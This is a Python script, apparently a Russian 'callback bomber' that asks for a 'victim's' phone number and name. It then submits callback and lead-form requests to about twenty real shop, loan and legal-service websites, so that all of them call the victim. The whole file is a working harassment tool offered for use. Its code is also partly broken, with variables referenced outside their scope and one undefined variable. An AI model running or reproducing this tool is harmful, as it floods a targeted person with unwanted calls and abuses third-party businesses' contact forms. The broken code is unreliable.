# coding=utf-8
# -*- coding: utf-8 -*-
# vim: set fileencoding=utf-8 :
import requests, datetime, os, random, transliterate, sys
from colorama import Fore

def clear(): 
    if os.name == 'nt': 
        _ = os.system('cls') 
    else: 
        _ = os.system('clear')


def someVars():

	truedata = str(datetime.datetime.today())
	truedata = truedata.split (' ')[0]

	names = ('Алексей', 'Иван', 'Константин', 'Петр', 'Семен', 'Матвей', 'Станислав', 'Владимир', 'Олег', 'Сергей')
	surnames = ('Иванов', 'Смирнов', 'Кузнецов', 'Попов', 'Васильев', 'Петров', 'Соколов', 'Михайлов', 'Новиков', 'Фёдоров', 'Морозов', 'Волков')
	patronymics = ('Богданович', 'Маркович', 'Олегович', 'Глебович', 'Александрович', 'Дмитриевич', 'Егорович', 'Георгиевич', 'Львович', 'Кириллович')
    
	randomemail = transliterate.translit(random.choice(names),  reversed=True) + transliterate.translit(random.choice(surnames),  reversed=True) + '@gmail.com'
	randompassword = transliterate.translit(random.choice(names),  reversed=True) + transliterate.translit(random.choice(surnames),  reversed=True)

	randomtimezone = int (random.random () * 10)
	randomzaim = int ((random.random () * 10)+10)
	randomid6 = str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9))

	problem = 'Здравствуйте, есть вопрос, прошу перезвонить!'
    
	messages = ('Здравствуйте, есть вопрос, прошу перезвонить!', 'Добрый день! Нужна консультация, прошу перезвонить!', 'Здравствуйте! Пожалуйста, перезвоните мне, спасибо!', 'Доброго дня, у меня есть вопрос, прошу вас перезвонить.', 'Приветствую! Пожалуйста, перезвоните!', 'Интересует вопрос по услуге, прошу перезвонить', 'Пожалуйста, свяжитесь со мной', 'Добрый день, жду Вашего звонка!')
	randomproblem = random.choice(messages)


def main ():

	someVars()

	print ('''
		
████─████─███─████─████─█──█─█─█─█──█
█──█─█──█──█──█──█─█──█─█─█──█─█─█──█
█──█─████──█──████─█────██───███─████
█──█─█──█──█──█──█─█──█─█─█────█─█──█
█──█─█──█──█──█──█─████─█──█─███─█──█

		''')

	phoneNum = input ('Номер телефона жертвы: ')
	name = input ('Имя жертвы: ')

	if name.strip() == '':
		name = random.choice (names)
	try:
		nikeshoes = requests.post ('https://nike-shoes.ru/index.php?route=extension/module/callback', data = {'name' : name, 'phone' : phoneNum, 'comment_buyer' : 'Обратный звонок', 'url_site' : 'https://nike-shoes.ru/muzhskaya_kollektsiya/nike_men/&action=send'})
		print(Fore.GREEN + 'Запрос отправлен: nike-shoes.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')
	try:
		krosale = requests.post ('https://krosale.com/client_account/feedback.json', data = {'feedback[subject]' : 'Обратный звонок', 'feedback[content]' : 'Обратный звонок', 'feedback[from]' : 'info@krosale.ru', 'feedback[name]' : name, 'feedback[phone]' : phoneNum})
		print(Fore.GREEN + 'Запрос отправлен: krosale.com')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')
	try:
		streetfoot = requests.post ('https://yaroslavl.streetfoot.ru/newforms/callbackform/callback-mail.php', data = {'firstauthor' : name, 'firstphone' : phoneNum, 'firstemail' : randomemail, 'firstcomment' : randomproblem})
		print(Fore.GREEN + 'Запрос отправлен: yaroslavl.streetfoot.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')
	try:				
		stepman = requests.post ('https://step-man.com/callback/callback-mail.php', data = {'firstauthor' : name, 'firstphone' : phoneNum, 'firstemail' : randomemail, 'firstcomment' : randomproblem})
		print(Fore.GREEN + 'Запрос отправлен: step-man.com')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')	
	try:
		prosto = requests.post ('https://pro100krossovki.ru/call', data = {'name' : name, 'phone' : phoneNum, 'mail' : randomemail, 'message' : randomproblem})
		print(Fore.GREEN + 'Запрос отправлен: pro100krossovki.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')	
	try:		
		bistromoney = requests.post ('https://bistrodengi.ru/ajax/lead.php', data = {'fio': name, 'phone': phoneNum})
		print(Fore.GREEN + 'Запрос отправлен: bistrodengi.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')	
	try:		
		diskkros = requests.post ('http://discount-krossovki.ru/call', data = {'name' : name, 'phone' : phoneNum, 'mail' : randomemail, 'message' : randomproblem})
		print(Fore.GREEN + 'Запрос отправлен: discount-krossovki.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')
	try:		
		sportshoes = requests.post ('https://sportshoes-shop.ru/mailer/sendmessage', data = {'formType' : '1', 'fio' : name, 'phone' : phoneNum, 'field1' : randomemail, 'content' : randomproblem})
		print(Fore.GREEN + 'Запрос отправлен: sportshoes-shop.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')	
	try:		
		moneza = requests.post ('https://www.moneza.ru/wp-content/api-client/api.php?request=callBackRequest', data = {'clientFullName' : name, 'phoneNumber' : phoneNum})	
		print(Fore.GREEN + 'Запрос отправлен: moneza.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')	
	try:
		warrant = requests.post ('https://www.warrant76.ru/callme', data = {'call_input' : phoneNum})
		print(Fore.GREEN + 'Запрос отправлен: warrant76.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')	
	try:		
		yarzabor = requests.post ('http://yar-zabor.ru/callme', data = {'call_input' : phoneNum})
		print(Fore.GREEN + 'Запрос отправлен: yar-zabor.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')	
	try:		
		goodtobacco = requests.post ('https://goodtobacco.ru/mail.php', json = {'user_name': name, 'user_email' : randomemail, 'user_phone' : phoneNum})
		print(Fore.GREEN + 'Запрос отправлен: goodtobacco.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')									
	try:		
		epleads = requests.post('https://epleads.ru/gate/api.php', data={'question': randomproblem,'region': 'Москва','first_lastname': name,'phone': phoneNum,'ofrid': '1','wid': '3','presetid': '4','referer': 'https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html','ip': '23.54.155.49','mobile': '0','template': 'form_master.new.fix.metrik_lawyer-blue-default','product': 'lawyer','userSoftData': '*'})
		print(Fore.GREEN + 'Запрос отправлен: epleads.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')	
	try:		
		rdftgbhnj = requests.post('https://xn----etbqwledi5fza.xn--p1ai/wp-json/contact-form-7/v1/contact-forms/295/feedback', data={'_wpcf7': '295','_wpcf7_version': '5.0.5','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f295-o2','_wpcf7_container_post': '0','text-838': name,'tel-231': phoneNum,'textarea-472': problem,'hidden-278': 'Главная'})
		print(Fore.GREEN + 'Вам позвонят')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')				
	try:		
		pravosfera = requests.post('https://pravo-sfera.ru/zayavk/', data={'cname': name, 'c_tel' : phoneNumVodaonline, 'quest': randomproblem, 'quest_go': 'Задать вопрос'})
		print(Fore.GREEN + 'Запрос отправлен: pravo-sfera.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')	
	try:		
		uristexpert24 = requests.post('https://urist-expert24.ru/sendmail/', data={'name': name, 'phone': phoneNumVodaonline, 'form-name': 'Заказ обратного звонка'})
		print(Fore.GREEN + 'Запрос отправлен: urist-expert24.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')		
	try:		
		gosurist = requests.post('http://www.gos-urist.ru/send.php', {'name': name, 'code': phoneNum, 'phone': phoneNum, 'issue': randomproblem})
		print(Fore.GREEN + 'Запрос отправлен: gos-urist.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')	
	try:		
		ur9911030 = requests.post('http://9911030.ru/orderform.php', {'name': name, 'phone': phoneNum, 'message': randomproblem})
		print(Fore.GREEN + 'Запрос отправлен: 9911030.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')	
	try:		
		findclone = requests.get('https://findclone.ru/register?phone=' + phoneNum, params={'phone': phoneNum})
		print(Fore.GREEN + 'Запрос отправлен: findclone.ru')
	except:
		print(Fore.RED + 'Запрос не отправлен :(') 
	try:		
		xiexpress = requests.get('https://xi.express/ajax/popup_callback.php', params={'sessid': '7b982d7c94989e44116b5176615b1071', 'save': 'Y', 'name': name, 'phone': phoneNum, 'selectedtype': 'Консультация по наличию и стоимости', 'numorders': '0', 'comment': randomproblem, 'subscribe': 'Y'})
		print(Fore.GREEN + 'Запрос отправлен: xi.express')
	except:
		print(Fore.RED + 'Запрос не отправлен :(')

	print('Операция завершена!')


if __name__ == '__main__':
	clear ()
	main ()
